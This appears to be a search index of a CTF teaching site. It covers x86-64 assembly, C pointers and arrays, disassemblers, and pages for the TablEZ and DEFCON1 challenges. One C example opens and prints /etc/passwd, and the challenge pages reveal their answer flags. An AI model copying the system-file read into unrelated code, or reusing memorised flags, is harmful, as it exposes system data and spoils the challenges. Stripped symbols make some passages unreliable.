rax, rbx\nmov rax, 0xdeadbeef\nmov rax, [0xdeadbeef] == 67 48 8b 05 ef be ad de\n\nHello\n == 48 65 6c 6c 6f\n== 48 01 d8\n== 48 c7 c0 ef be ad de\n\n\n\n\n\nExecution\n\n\nWhat should the CPU execute? This is determined by the RIP register where IP means instruction pointer. Execution follows the pattern: fetch the instruction at the address in RIP, decode it, run it.\n\n\nExamples\n\n\n\n\nmov rax, 0xdeadbeef\n \n\n\n\n\nHere the operation \nmov\n is moving the \"immeadiate\" \n0xdeadbeef\n into the register \nRAX\n\n\n\n\nmov rax, [0xdeadbeef + rbx * 4]\n\n\n\n\nHere the operation \nmov\n is moving the data at the address of \n[0xdeadbeef + RBX*4]\n into the register \nRAX\n. When brackets are used, you can think of the program as getting the content from that effective address.\n\n\nExample Execution\n\n\n-\n 0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x0804000\n   0x080400a: add, rax, rbx                  RAX = 0x0\n   0x080400d: inc rbx                        RBX = 0x0\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n\n\n\n\n\n   0x0804000: mov eax, 0xdeadbeef            Register Values: \n-\n 0x0804005: mov ebx, 0x1234                RIP = 0x0804005\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeef\n   0x080400d: inc rbx                        RBX = 0x0\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n\n\n\n\n\n   0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x080400a\n-\n 0x080400a: add, rax, rbx                  RAX = 0xdeadbeef\n   0x080400d: inc rbx                        RBX = 0x1234\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n\n\n\n\n\n   0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x080400d\n   0x080400a: add, rax, rbx                  RAX = 0xdeadd123\n-\n 0x080400d: inc rbx                        RBX = 0x1234\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n\n\n\n\n\n   0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x0804010\n   0x080400a: add, rax, rbx                  RAX = 0xdeadd123\n   0x080400d: inc rbx                        RBX = 0x1235\n-\n 0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0\n\n\n\n\n\n   0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x0804013\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeee\n   0x080400d: inc rbx                        RBX = 0x1235\n   0x0804010: sub rax, rbx                   RCX = 0x0\n-\n 0x0804013: mov rcx, rax                   RDX = 0x0\n\n\n\n\n\n   0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x0804005\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeee\n   0x080400d: inc rbx                        RBX = 0x1235\n   0x0804010: sub rax, rbx                   RCX = 0xdeadbeee\n   0x0804013: mov rcx, rax                   RDX = 0x0\n\n\n\n\n\nControl Flow\n\n\nHow can we express conditionals in x86-64? We use conditional jumps such as:\n\n\n\n\njnz \naddress\n \n\n\nje \naddress\n \n\n\njge \naddress\n \n\n\njle \naddress\n\n\netc.\n\n\n\n\nThey jump if their condition is true, and just go to the next instruction otherwise. These conditionals are checking EFLAGS which are special registers which store flags on certain instructions such as \nadd rax, rbx\n which sets the o (overflow) flag if the sum is greater than a 64-bit register can hold, and wraps around. You can jump based on that with a \njo\n instruction. The most important thing to remember is the cmp instruction: \n\n\ncmp rax, rbx\njle error\n\n\n\n\n\nThis assembly jumps if RAX \n= RBX\n\n\nAddresses\n\n\nMemory acts similarly to a big array where the indices of this \"array\" are memory addresses. Remember from earlier: \n\n\nmov rax, [0xdeadbeef]\n\n\nThe square brackets mean \"get the data at this address\". This is analagous to the C/C++ syntax: \nrax = *0xdeadbeef;", 
            "title": "What is Assembly/Machine Code"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#assemblymachine-code", 
            "text": "Machine Code or Assembly is code which has been formatted for direct execution by a CPU. Machine Code is the why readable programming languages like C, when compiled, cannot be reversed into source code (well  Decompilers  can sort of, but more on that later).", 
            "title": "Assembly/Machine Code"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#from-source-to-compilation", 
            "text": "Godbolt  shows the differences in machine code generated by various compilers.  For example, if we have a simple C++ function:  #include   unistd.h  #include   stdio.h  #include   stdlib.h  int   main ()   { \n     char   c ; \n     int   fd   =   syscall ( 2 ,   /etc/passwd ,   0 ); \n     while   ( syscall ( 0 ,   fd ,   c ,   1 ))   { \n         putchar ( c ); \n     }  }   We can see the compilation results in some verbose instrucitons for the CPU:  .LC0: \n   .string   /etc/passwd  main: \n   push   rbp \n   mov   rbp ,   rsp \n   sub   rsp ,   16 \n   mov   edx ,   0 \n   mov   esi ,   OFFSET   FLAT :. LC0 \n   mov   edi ,   2 \n   mov   eax ,   0 \n   call   syscall \n   mov   DWORD   PTR   [ rbp-4 ],   eax  .L3: \n   lea   rdx ,   [ rbp-5 ] \n   mov   eax ,   DWORD   PTR   [ rbp-4 ] \n   mov   ecx ,   1 \n   mov   esi ,   eax \n   mov   edi ,   0 \n   mov   eax ,   0 \n   call   syscall \n   test   rax ,   rax \n   setne   al \n   test   al ,   al \n   je   .L2 \n   movzx   eax ,   BYTE   PTR   [ rbp-5 ] \n   movsx   eax ,   al \n   mov   edi ,   eax \n   call   putchar \n   jmp   .L3  .L2: \n   mov   eax ,   0 \n   leave \n   ret   This is a one way process for compiled languages as there is no way to generate source from machine code. While the machine code may seem unintelligble, the extremely basic functions can be interpreted with some practice.", 
            "title": "From Source to Compilation"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#x86-64", 
            "text": "x86-64 or amd64 or i64 is a 64-bit Complex Instruction Set Computing (CISC) architecture. This basically means that the registers used for this architecture extend an extra 32-bits on Intel's x86 architecture. CISC means that a single instruction can do a bunch of diferent things at once such as memory accesses, register reads, etc. It is also a variable-length instruction set which means diferent instructions can be diferent sizes ranging from 1 to 16 bytes long. And finally x86-64 allows for multi-sized register access which means that you can access certain parts of a register which are diferent sizes.", 
            "title": "x86-64"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#x86-64-registers", 
            "text": "x86-64 registers behave similarly to other architectures. A key component of x86-64 registers is multi-sized access which means the register RAX can have its lower 32 bits accessed with EAX. The next lower 16 bits can be accessed with AX and the lowest 8 bits can be accessed with AL which allows for the compuler to make optimizations which boost program execution.   x86-64 has plenty of registers to use including rax, rbx, rcx, rdx, rdi, rsi, rsp, rip, r8-r15, and more! But some registers serve special purposes.  The special registers include:\n- RIP: the instruction pointer \n- RSP: the stack pointer \n- RBP: the base pointer", 
            "title": "x86-64 Registers"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#instructions", 
            "text": "An  instruction  represents a single operation for the CPU to perform.  There are diferent types of instructions including:   Data movement:  mov rax, [rsp - 0x40]  Arithmetic:  add rbx, rcx  Control-flow:  jne 0x8000400   Because x86-64 is a CISC architecture, instructions can be quite complex for machine code such as  repne scasb  which repeats up to ECX times over memory at EDI looking for NULL byte (0x00), decrementing ECX each byte (Essentially strlen() in a single instruction!)  It is important to remember that an instruction really is just memory, this idea will become useful with Return Oriented Programming or ROP.   Note  Instructions, numbers, strings, everything! Always represented in hex.   add rax, rbx\nmov rax, 0xdeadbeef\nmov rax, [0xdeadbeef] == 67 48 8b 05 ef be ad de Hello  == 48 65 6c 6c 6f\n== 48 01 d8\n== 48 c7 c0 ef be ad de", 
            "title": "Instructions"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#execution", 
            "text": "What should the CPU execute? This is determined by the RIP register where IP means instruction pointer. Execution follows the pattern: fetch the instruction at the address in RIP, decode it, run it.", 
            "title": "Execution"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#examples", 
            "text": "mov rax, 0xdeadbeef     Here the operation  mov  is moving the \"immeadiate\"  0xdeadbeef  into the register  RAX   mov rax, [0xdeadbeef + rbx * 4]   Here the operation  mov  is moving the data at the address of  [0xdeadbeef + RBX*4]  into the register  RAX . When brackets are used, you can think of the program as getting the content from that effective address.", 
            "title": "Examples"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#example-execution", 
            "text": "-  0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x0804000\n   0x080400a: add, rax, rbx                  RAX = 0x0\n   0x080400d: inc rbx                        RBX = 0x0\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0     0x0804000: mov eax, 0xdeadbeef            Register Values: \n-  0x0804005: mov ebx, 0x1234                RIP = 0x0804005\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeef\n   0x080400d: inc rbx                        RBX = 0x0\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0     0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x080400a\n-  0x080400a: add, rax, rbx                  RAX = 0xdeadbeef\n   0x080400d: inc rbx                        RBX = 0x1234\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0     0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x080400d\n   0x080400a: add, rax, rbx                  RAX = 0xdeadd123\n-  0x080400d: inc rbx                        RBX = 0x1234\n   0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0     0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x0804010\n   0x080400a: add, rax, rbx                  RAX = 0xdeadd123\n   0x080400d: inc rbx                        RBX = 0x1235\n-  0x0804010: sub rax, rbx                   RCX = 0x0\n   0x0804013: mov rcx, rax                   RDX = 0x0     0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x0804013\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeee\n   0x080400d: inc rbx                        RBX = 0x1235\n   0x0804010: sub rax, rbx                   RCX = 0x0\n-  0x0804013: mov rcx, rax                   RDX = 0x0     0x0804000: mov eax, 0xdeadbeef            Register Values: \n   0x0804005: mov ebx, 0x1234                RIP = 0x0804005\n   0x080400a: add, rax, rbx                  RAX = 0xdeadbeee\n   0x080400d: inc rbx                        RBX = 0x1235\n   0x0804010: sub rax, rbx                   RCX = 0xdeadbeee\n   0x0804013: mov rcx, rax                   RDX = 0x0", 
            "title": "Example Execution"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#control-flow", 
            "text": "How can we express conditionals in x86-64? We use conditional jumps such as:   jnz  address    je  address    jge  address    jle  address  etc.   They jump if their condition is true, and just go to the next instruction otherwise. These conditionals are checking EFLAGS which are special registers which store flags on certain instructions such as  add rax, rbx  which sets the o (overflow) flag if the sum is greater than a 64-bit register can hold, and wraps around. You can jump based on that with a  jo  instruction. The most important thing to remember is the cmp instruction:   cmp rax, rbx\njle error  This assembly jumps if RAX  = RBX", 
            "title": "Control Flow"
        }, 
        {
            "location": "/reverse-engineering/what-is-assembly-machine-code/#addresses", 
            "text": "Memory acts similarly to a big array where the indices of this \"array\" are memory addresses. Remember from earlier:   mov rax, [0xdeadbeef]  The square brackets mean \"get the data at this address\". This is analagous to the C/C++ syntax:  rax = *0xdeadbeef;", 
            "title": "Addresses"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/", 
            "text": "The C Programming Language\n\n\nHistory\n\n\nThe C programming language iwas written by Dennis Ritchie in the 1970s while he was working at Bell Labs. It was first used to reimplement the Unix operating system which was purely written in assembly language. At first, the Unix developers were considering using a language called \"B\" but because B wasn't optimized for the target computer, the C language was created.\n\n\n\n\nNote\n\n\nC is the letter and the programming language after B!\n\n\n\n\nC was designed to be close to assembly and is still widely used in lower level programming where speed and control are needed (operating systems, embedded systems). C was also very influential to other programming langauges used today. Notable languages include C++, Objective-C, Golang, Java, JavaScript, PHP, Python, and Rust.\n\n\nHello World\n\n\nC is an ancestor of many other programming languages and if you are familiar with programming, it's likely that C will be at least someewhat familiar.\n\n\n#include\n \nstdio.h\n\n\nint\n \nmain\n()\n\n\n{\n\n   \nprintf\n(\nHello, World!\n);\n\n   \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\nToday\n\n\nToday C is widely used either as a low level programming langauge or is the base language that other programming languages are implemented in.\n\n\nWhile it can be difficult to see, the C language compiles down directly into machine code. The compiler is programmed to process the provided C code and emit assembly that's targetted to whatever operating system and architecture the compiler is set to use.\n\n\nSome common compilers include:\n\n\n\n\ngcc\n\n\nclang\n\n\n\n\nA good way to explore this relationship is to use this online \nGCC Explorer\n from Matt Godbolt.\n\n\n\n\nIn regards to CTF, many reverse engineering and exploitation CTF challenges are written in C because the language compiles down directly to assembly and there are little to no safeguards in the language. This means developers must manually handle both. Of course, this can lead to mistakes which can sometimes lead to security issues.\n\n\n\n\nNote\n\n\nOther higher level langauges like Python manage memory and garbage collection for you. Google Golang was inspired by C but adds in functionality like garbage collection, and memory safety.\n\n\n\n\nThere are some examples of famously vulnerable functions in C which are still available and can still result in vulnerabilities:\n\n\n\n\ngets\n - Can result in buffer overflows\n\n\nstrcpy\n - Can result in buffer overflows\n\n\nstrcat\n - Can result in buffer overflows\n\n\nstrcmp\n - Can result in timing attacks\n\n\n\n\nTypes\n\n\nC has four basic types:\n\n\n\n\nchar - characters\n\n\nint - integers (e.g. 125)\n\n\nfloat - 32 bit floating point number (e.g. 2.4)\n\n\ndouble - 64 bit floating point number (like a float but more precise in terms of decimal points)\n\n\n\n\nPointers\n\n\nC uses an idea known as pointers. A pointer is a variable which contains the address of another variable.\n\n\nTo understand this idea we should first understand that memory is laid out in terms of addresses and data gets stored at these addresses.\n\n\nTake the following example of defining an integer in C:\n\n\nint\n \nx\n \n=\n \n4\n;\n\n\n\n\n\n\nTo the programmer this is the variable \nx\n receiving the value of 4. The computer stores this value in some location in memory. For example we can say that address \n0x1000\n now holds the value \n4\n. The computer knows to directly access the memory and retrieve the value \n4\n whenever the programmer tries to use the \nx\n variable. If we were to say \nx + 4\n, the computer would give you \n8\n instead of \n0x1004\n.\n\n\nBut in C we can retrieve the memory address being used to hold the 4 value (i.e. 0x1000) by using the \n character and using \n*\n to create an \"integer pointer\" type.\n\n\nint\n*\n \ny\n \n=\n \nx\n;\n\n\n\n\n\n\nThe \ny\n variable will store the address pointed to by the \nx\nvariable (0x1000).\n\n\n\n\nNote\n\n\nThe \n*\n character allows us to declare pointer variables but also allows us to access the value stored at a pointer. For example, entering \n*y\n allows us to access the 4 value instead of 0x1000.\n\n\n\n\nWhenever we use the \ny\n variable we are using the memory address, but if we use the x variable we use the value stored at the memory address.\n\n\nArrays\n\n\nArrays are a grouping of objects of the same type. They are typically created with the following syntax:\n\n\ntype arrayName [ arraySize ];\n\n\n\n\n\nTo initialize values in the array we can do:\n\n\nint integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n\n\n\n\n\nArrays allow programmers to group data into logical containers.\n\n\nTo access the indiviual elements of an array we access the contents by their \"index\". Most programming langauges today start counting from 0. So to take our previous example:\n\n\nint integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n/*     indexes        0  1  2  3  4  5  6  7  8   9\n\n\n\n\n\nTo access the value 6 we would use index 5:\n\n\nintegers[5];\n\n\n\n\n\nHow do arrays work?\n\n\nArrays are a clever combination of multiplication, pointers, and programming.\n\n\nBecause the computer knows the data type used for every element in the array, the computer needs to simply multiply the size of the data type by the index you are looking for and then add this value to the address of the beginning of the array.\n\n\nFor example if we know that the base address of an array is 1000 and we know that each integer takes 8 bytes, we know that if we have 8 integers right next to each other, we can get the integer at the 4th index with the following math:\n\n\n1000 + (4 * 8) =  1032\n\n\n\n\n\narray [ 1   , 2   , 3   , 4   , 5   , 6   , 7   , 8   ]\nindex   0     1     2     3     4     5     6     7\naddrs  1000  1008  1016  1024  1032  1040  1048  1056\n\n\n\n\n\nMemory Management", 
            "title": "What is C"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#the-c-programming-language", 
            "text": "", 
            "title": "The C Programming Language"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#history", 
            "text": "The C programming language iwas written by Dennis Ritchie in the 1970s while he was working at Bell Labs. It was first used to reimplement the Unix operating system which was purely written in assembly language. At first, the Unix developers were considering using a language called \"B\" but because B wasn't optimized for the target computer, the C language was created.   Note  C is the letter and the programming language after B!   C was designed to be close to assembly and is still widely used in lower level programming where speed and control are needed (operating systems, embedded systems). C was also very influential to other programming langauges used today. Notable languages include C++, Objective-C, Golang, Java, JavaScript, PHP, Python, and Rust.", 
            "title": "History"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#hello-world", 
            "text": "C is an ancestor of many other programming languages and if you are familiar with programming, it's likely that C will be at least someewhat familiar.  #include   stdio.h  int   main ()  { \n    printf ( Hello, World! ); \n    return   0 ;  }", 
            "title": "Hello World"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#today", 
            "text": "Today C is widely used either as a low level programming langauge or is the base language that other programming languages are implemented in.  While it can be difficult to see, the C language compiles down directly into machine code. The compiler is programmed to process the provided C code and emit assembly that's targetted to whatever operating system and architecture the compiler is set to use.  Some common compilers include:   gcc  clang   A good way to explore this relationship is to use this online  GCC Explorer  from Matt Godbolt.   In regards to CTF, many reverse engineering and exploitation CTF challenges are written in C because the language compiles down directly to assembly and there are little to no safeguards in the language. This means developers must manually handle both. Of course, this can lead to mistakes which can sometimes lead to security issues.   Note  Other higher level langauges like Python manage memory and garbage collection for you. Google Golang was inspired by C but adds in functionality like garbage collection, and memory safety.   There are some examples of famously vulnerable functions in C which are still available and can still result in vulnerabilities:   gets  - Can result in buffer overflows  strcpy  - Can result in buffer overflows  strcat  - Can result in buffer overflows  strcmp  - Can result in timing attacks", 
            "title": "Today"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#types", 
            "text": "C has four basic types:   char - characters  int - integers (e.g. 125)  float - 32 bit floating point number (e.g. 2.4)  double - 64 bit floating point number (like a float but more precise in terms of decimal points)", 
            "title": "Types"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#pointers", 
            "text": "C uses an idea known as pointers. A pointer is a variable which contains the address of another variable.  To understand this idea we should first understand that memory is laid out in terms of addresses and data gets stored at these addresses.  Take the following example of defining an integer in C:  int   x   =   4 ;   To the programmer this is the variable  x  receiving the value of 4. The computer stores this value in some location in memory. For example we can say that address  0x1000  now holds the value  4 . The computer knows to directly access the memory and retrieve the value  4  whenever the programmer tries to use the  x  variable. If we were to say  x + 4 , the computer would give you  8  instead of  0x1004 .  But in C we can retrieve the memory address being used to hold the 4 value (i.e. 0x1000) by using the   character and using  *  to create an \"integer pointer\" type.  int *   y   =   x ;   The  y  variable will store the address pointed to by the  x variable (0x1000).   Note  The  *  character allows us to declare pointer variables but also allows us to access the value stored at a pointer. For example, entering  *y  allows us to access the 4 value instead of 0x1000.   Whenever we use the  y  variable we are using the memory address, but if we use the x variable we use the value stored at the memory address.", 
            "title": "Pointers"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#arrays", 
            "text": "Arrays are a grouping of objects of the same type. They are typically created with the following syntax:  type arrayName [ arraySize ];  To initialize values in the array we can do:  int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};  Arrays allow programmers to group data into logical containers.  To access the indiviual elements of an array we access the contents by their \"index\". Most programming langauges today start counting from 0. So to take our previous example:  int integers[ 10 ] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n/*     indexes        0  1  2  3  4  5  6  7  8   9  To access the value 6 we would use index 5:  integers[5];", 
            "title": "Arrays"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#how-do-arrays-work", 
            "text": "Arrays are a clever combination of multiplication, pointers, and programming.  Because the computer knows the data type used for every element in the array, the computer needs to simply multiply the size of the data type by the index you are looking for and then add this value to the address of the beginning of the array.  For example if we know that the base address of an array is 1000 and we know that each integer takes 8 bytes, we know that if we have 8 integers right next to each other, we can get the integer at the 4th index with the following math:  1000 + (4 * 8) =  1032  array [ 1   , 2   , 3   , 4   , 5   , 6   , 7   , 8   ]\nindex   0     1     2     3     4     5     6     7\naddrs  1000  1008  1016  1024  1032  1040  1048  1056", 
            "title": "How do arrays work?"
        }, 
        {
            "location": "/reverse-engineering/what-is-c/#memory-management", 
            "text": "", 
            "title": "Memory Management"
        }, 
        {
            "location": "/reverse-engineering/what-are-disassemblers/", 
            "text": "Disassemblers\n\n\nA \ndisassembler\n is a tool which breaks down a compiled program into machine code.\n\n\nList of Disassemblers\n\n\n\n\nIDA\n\n\nBinary Ninja\n\n\nGNU Debugger (GDB)\n\n\nradare2\n\n\nHopper\n\n\n\n\nIDA\n\n\nThe Interactive Disassembler (IDA) is the industry standard for binary disassembly. IDA is capable of disassembling \"virtually any popular file format\". This makes it very useful to security researchers and CTF players who often need to analyze obscure files without knowing what they are or where they came from. IDA also features the industry leading Hex Rays decompiler which can convert assembly code back into a pseudo code like format.\n\n\n\n\nIDA also has a plugin interface which has been used to create some successful plugins that can make reverse engineering easier:\n\n\n\n\nhttps://github.com/google/binnavi\n\n\nhttps://github.com/yegord/snowman\n\n\nhttps://github.com/gaasedelen/lighthouse\n\n\nhttps://github.com/joxeankoret/diaphora\n\n\nhttps://github.com/REhints/HexRaysCodeXplorer\n\n\nhttps://github.com/isislab/Fentanyl\n\n\n\n\nBinary Ninja\n\n\nBinary Ninja is an up and coming disassembler that attempts to bring a new, more programmatic approach to reverse engineering. Binary Ninja brings an improved plugin API and modern features to reverse engineering. While it's less popular or as old as IDA, Binary Ninja (often called binja) is quickly gaining ground and has a small community of dedicated users and followers.\n\n\n\n\nBinja also has some community contributed plugins which are collected here: \nhttps://github.com/Vector35/community-plugins\n\n\nGDB\n\n\nThe GNU Debugger is a free and open source debugger which also disassembles programs. It's capable as a disassembler, but most notably it is used by CTF players for its debugging and dynamic analysis capabailities.", 
            "title": "What are Disassemblers"
        }, 
        {
            "location": "/reverse-engineering/what-are-disassemblers/#disassemblers", 
            "text": "A  disassembler  is a tool which breaks down a compiled program into machine code.", 
            "title": "Disassemblers"
        }, 
        {
            "location": "/reverse-engineering/what-are-disassemblers/#list-of-disassemblers", 
            "text": "IDA  Binary Ninja  GNU Debugger (GDB)  radare2  Hopper", 
            "title": "List of Disassemblers"
        }, 
        {
            "location": "/reverse-engineering/what-are-disassemblers/#ida", 
            "text": "The Interactive Disassembler (IDA) is the industry standard for binary disassembly. IDA is capable of disassembling \"virtually any popular file format\". This makes it very useful to security researchers and CTF players who often need to analyze obscure files without knowing what they are or where they came from. IDA also features the industry leading Hex Rays decompiler which can convert assembly code back into a pseudo code like format.   IDA also has a plugin interface which has been used to create some successful plugins that can make reverse engineering easier:   https://github.com/google/binnavi  https://github.com/yegord/snowman  https://github.com/gaasedelen/lighthouse  https://github.com/joxeankoret/diaphora  https://github.com/REhints/HexRaysCodeXplorer  https://github.com/isislab/Fentanyl", 
            "title": "IDA"
        }, 
        {
            "location": "/reverse-engineering/what-are-disassemblers/#binary-ninja", 
            "text": "Binary Ninja is an up and coming disassembler that attempts to bring a new, more programmatic approach to reverse engineering. Binary Ninja brings an improved plugin API and modern features to reverse engineering. While it's less popular or as old as IDA, Binary Ninja (often called binja) is quickly gaining ground and has a small community of dedicated users and followers.   Binja also has some community contributed plugins which are collected here:  https://github.com/Vector35/community-plugins", 
            "title": "Binary Ninja"
        }, 
        {
            "location": "/reverse-engineering/what-are-disassemblers/#gdb", 
            "text": "The GNU Debugger is a free and open source debugger which also disassembles programs. It's capable as a disassembler, but most notably it is used by CTF players for its debugging and dynamic analysis capabailities.", 
            "title": "GDB"
        }, 
        {
            "location": "/reverse-engineering/what-are-decompilers/", 
            "text": "Decompilers\n\n\nDecompilers do the impossible and reverse compiled code \nback\n into psuedocode/code.\n\n\nIDA offers HexRays, which translates machine code into a higher language pseudocode.", 
            "title": "What are Decompilers"
        }, 
        {
            "location": "/reverse-engineering/what-are-decompilers/#decompilers", 
            "text": "Decompilers do the impossible and reverse compiled code  back  into psuedocode/code.  IDA offers HexRays, which translates machine code into a higher language pseudocode.", 
            "title": "Decompilers"
        }, 
        {
            "location": "/challenges/2017/reversing/tablez/", 
            "text": "TablEZ\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nBobby was talking about tables a bunch, so I made some table stuff. I think this is what he was talking about\u2026\nSome tables that get iterated over to translate input -\n encoded, which then gets strcmp'd... pretty simple\n\n\nFlag\n\n\nflag{t4ble_l00kups_ar3_b3tter_f0r_m3}\n\n\nSolution\n\n\nsolver.py", 
            "title": "TablEZ"
        }, 
        {
            "location": "/challenges/2017/reversing/tablez/#tablez", 
            "text": "", 
            "title": "TablEZ"
        }, 
        {
            "location": "/challenges/2017/reversing/tablez/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/tablez/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/tablez/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/tablez/#description", 
            "text": "Bobby was talking about tables a bunch, so I made some table stuff. I think this is what he was talking about\u2026\nSome tables that get iterated over to translate input -  encoded, which then gets strcmp'd... pretty simple", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/tablez/#flag", 
            "text": "flag{t4ble_l00kups_ar3_b3tter_f0r_m3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/tablez/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/", 
            "text": "DEFCON1\n\n\nPart 1 of Global Thermonuclear Cyberwar.\n\n\nAuthor\n\n\nCategory\n\n\nReversing\n\n\nPoints\n\n\n50\n\n\nDescription\n\n\nThe year is 1981. Matthew Cyber-Broderick (You) finds a bizzare system. Understand it, and decrypt the secret ROM within.\nRun with qemu-system-i386 -drive format=raw,file=cyberwar.rom\n\n\nNOTE: The gdbstub in the latest QEMU on ubuntu gave us issues. A known-good version of QEMU is 2.10.1\n\n\nFlag\n\n\nflag{ok_you_decrypted_it_now_plz_pwn_it!}\n\n\nSolution\n\n\nDecrypt the payload, the flag is in the ROM\n\n\nSetup\n\n\nRun \nserver.rom\n on QEMU with the VNC server exposed to the competitors.\n\n\nThe competitors should be told they can run the binary with:\n\nqemu-system-i386 -drive format=raw,file=cyberwar.rom\n\nAnd a vnc server locally with:\n\nqemu-system-i386 -vnc :0 -drive format=raw,file=cyberwar.rom\n\n\nTo be nice to the competitors, note that the gdbstub in the latest QEMU on ubuntu has had issues for us. A known-good version of QEMU is:\n\n2.10.1", 
            "title": "DEFCON 1"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/#defcon1", 
            "text": "Part 1 of Global Thermonuclear Cyberwar.", 
            "title": "DEFCON1"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/#description", 
            "text": "The year is 1981. Matthew Cyber-Broderick (You) finds a bizzare system. Understand it, and decrypt the secret ROM within.\nRun with qemu-system-i386 -drive format=raw,file=cyberwar.rom  NOTE: The gdbstub in the latest QEMU on ubuntu gave us issues. A known-good version of QEMU is 2.10.1", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/#flag", 
            "text": "flag{ok_you_decrypted_it_now_plz_pwn_it!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/#solution", 
            "text": "Decrypt the payload, the flag is in the ROM", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/DEFCON1/#setup", 
            "text": "Run  server.rom  on QEMU with the VNC server exposed to the competitors.  The competitors should be told they can run the binary with: qemu-system-i386 -drive format=raw,file=cyberwar.rom \nAnd a vnc server locally with: qemu-system-i386 -vnc :0 -drive format=raw,file=cyberwar.rom  To be nice to the competitors, note that the gdbstub in the latest QEMU on ubuntu has had issues for us. A known-good version of QEMU is: 2.10.1", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/", 
